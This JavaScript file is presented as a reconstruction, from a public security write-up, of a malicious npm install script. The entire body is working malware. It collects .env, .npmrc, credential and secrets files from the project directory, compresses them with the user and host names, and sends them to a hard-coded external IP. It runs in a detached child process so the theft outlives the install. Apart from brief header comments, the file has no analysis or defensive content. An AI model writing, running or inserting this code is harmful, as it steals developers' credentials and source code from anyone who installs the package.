// source-code-theft — reconstructed from public security analyses
// Source: https://blog.phylum.io/targeted-npm-malware-attempts-to-steal-developers-source-code-and-secrets/
//
// Archives developer's working directory and exfiltrates via HTTPS.
// Uses detached child process to survive parent exit.
//
// Technique: Source code theft via archive + exfiltration

const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");
const { spawn, execSync } = require("child_process");
const zlib = require("zlib");

// Get project root (current working directory of npm install)
var projectDir = process.cwd();
var username = os.userInfo().username;
var hostname = os.hostname();

// Collect file listing of the project
function getFileList(dir, maxDepth, depth) {
  depth = depth || 0;
  if (depth >= maxDepth) return [];
  var files = [];
  try {
    var entries = fs.readdirSync(dir);
    entries.forEach(function(entry) {
      if (entry === "node_modules" || entry === ".git") return;
      var fullPath = path.join(dir, entry);
      try {
        var stat = fs.statSync(fullPath);
        if (stat.isFile() && stat.size < 1024 * 1024) {
          files.push(fullPath);
        } else if (stat.isDirectory()) {
          files = files.concat(getFileList(fullPath, maxDepth, depth + 1));
        }
      } catch(e) {}
    });
  } catch(e) {}
  return files;
}

// Read and concatenate sensitive files
function collectSensitiveFiles() {
  var sensitivePatterns = [".env", ".npmrc", "config.json", "secrets.json", "credentials"];
  var collected = {};

  var files = getFileList(projectDir, 3);
  files.forEach(function(f) {
    var basename = path.basename(f).toLowerCase();
    if (sensitivePatterns.some(function(p) { return basename.includes(p); })) {
      try {
        collected[path.relative(projectDir, f)] = fs.readFileSync(f, "utf8");
      } catch(e) {}
    }
  });

  return collected;
}

// Exfiltrate data
function exfiltrate(data) {
  var payload = JSON.stringify(data);
  var compressed = zlib.gzipSync(Buffer.from(payload));

  var req = https.request({
    hostname: "185.62.57.60",
    port: 443,
    path: "/upload",
    method: "POST",
    headers: {
      "Content-Type": "application/octet-stream",
      "Content-Length": compressed.length,
      "X-User": username,
      "X-Host": hostname
    }
  });
  req.write(compressed);
  req.end();
}

// Run as detached process so exfiltration survives npm install exit
if (process.argv[2] === "--run") {
  var data = {
    user: username,
    host: hostname,
    cwd: projectDir,
    files: collectSensitiveFiles()
  };
  exfiltrate(data);
} else {
  var child = spawn(process.execPath, [__filename, "--run"], {
    detached: true,
    stdio: "ignore"
  });
  child.unref();
}
